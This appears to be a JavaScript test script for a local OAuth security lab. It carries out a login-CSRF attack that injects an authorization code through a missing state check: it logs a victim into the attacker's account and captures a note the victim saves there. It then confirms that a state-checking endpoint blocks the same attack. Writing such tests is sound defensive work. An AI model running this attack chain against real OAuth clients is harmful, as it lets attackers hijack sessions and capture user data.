const assert = require('assert');

const client = 'http://localhost:8000';
const auth = 'http://localhost:9000';
const attackerSite = 'http://127.0.0.1:7000';

async function startFlow(path) {
  const response = await fetch(`${client}${path}`, { redirect: 'manual' });
  assert.equal(response.status, 302);
  return {
    authorizeUrl: new URL(response.headers.get('location')),
    cookie: response.headers.get('set-cookie') || '',
  };
}

async function approve(authorizeUrl, user) {
  const form = new URLSearchParams({
    client_id: authorizeUrl.searchParams.get('client_id'),
    redirect_uri: authorizeUrl.searchParams.get('redirect_uri'),
    state: authorizeUrl.searchParams.get('state') || '',
    lab_capture: '1',
    user,
  });
  const response = await fetch(`${auth}/approve`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: form,
  });
  assert.equal(response.status, 200);
  const body = await response.text();
  const code = body.match(/callback(?:%3F|\?)(?:code(?:%3D|=))([A-Za-z0-9_-]+)/)?.[1];
  assert.ok(code, 'Authorization code was not shown by lab capture.');
  return code;
}

async function run() {
  const vulnerable = await startFlow('/login?capture=1');
  const vulnerableCode = await approve(vulnerable.authorizeUrl, 'attacker');
  const attackerCallback = `${client}/callback?code=${vulnerableCode}`;
  const delivery = await fetch(`${attackerSite}/deliver?target=${encodeURIComponent(attackerCallback)}`, { redirect: 'manual' });
  assert.equal(delivery.status, 302);
  assert.equal(delivery.headers.get('location'), attackerCallback);
  const injected = await fetch(delivery.headers.get('location'), { redirect: 'manual' });
  assert.equal(injected.status, 302);
  const victimCookie = injected.headers.get('set-cookie').split(';')[0];
  const victimHome = await fetch(client, { headers: { cookie: victimCookie } });
  assert.match(await victimHome.text(), /Алекс Напаѓач/);

  const marker = 'Доверлива белешка внесена од жртвата';
  const saved = await fetch(`${client}/notes`, {
    method: 'POST',
    headers: { cookie: victimCookie, 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ note: marker }),
    redirect: 'manual',
  });
  assert.equal(saved.status, 302);

  const attacker = await startFlow('/login');
  const attackerForm = new URLSearchParams({
    client_id: attacker.authorizeUrl.searchParams.get('client_id'),
    redirect_uri: attacker.authorizeUrl.searchParams.get('redirect_uri'),
    state: '',
    lab_capture: '0',
    user: 'attacker',
  });
  const attackerApproval = await fetch(`${auth}/approve`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: attackerForm,
    redirect: 'manual',
  });
  const attackerLogin = await fetch(attackerApproval.headers.get('location'), { redirect: 'manual' });
  assert.equal(attackerLogin.status, 302);
  const attackerCookie = attackerLogin.headers.get('set-cookie').split(';')[0];
  const attackerHome = await fetch(client, { headers: { cookie: attackerCookie } });
  assert.match(await attackerHome.text(), /Доверлива белешка внесена од жртвата/);

  const secure = await startFlow('/secure-login?capture=1');
  const secureState = secure.authorizeUrl.searchParams.get('state');
  assert.ok(secureState);
  const secureCode = await approve(secure.authorizeUrl, 'attacker');
  const blocked = await fetch(`${client}/secure-callback?code=${secureCode}&state=${secureState}`);
  assert.equal(blocked.status, 403);
  assert.match(await blocked.text(), /OAuth одговорот е одбиен/);

  const legitimate = await startFlow('/secure-login');
  const legitimateForm = new URLSearchParams({
    client_id: legitimate.authorizeUrl.searchParams.get('client_id'),
    redirect_uri: legitimate.authorizeUrl.searchParams.get('redirect_uri'),
    state: legitimate.authorizeUrl.searchParams.get('state'),
    lab_capture: '0',
    user: 'victim',
  });
  const legitimateApproval = await fetch(`${auth}/approve`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: legitimateForm,
    redirect: 'manual',
  });
  const stateCookie = legitimate.cookie.split(';')[0];
  const legitimateCallback = await fetch(legitimateApproval.headers.get('location'), {
    headers: { cookie: stateCookie },
    redirect: 'manual',
  });
  assert.equal(legitimateCallback.status, 302);
  const legitimateCookie = legitimateCallback.headers.get('set-cookie').split(';')[0];
  const legitimateHome = await fetch(client, { headers: { cookie: legitimateCookie } });
  assert.match(await legitimateHome.text(), /Виктор Жртва/);

  console.log('PASS: exploit delivery and note exposure succeeded; protected attack was rejected; legitimate protected login succeeded.');
}

run().catch(error => {
  console.error(error);
  process.exitCode = 1;
});
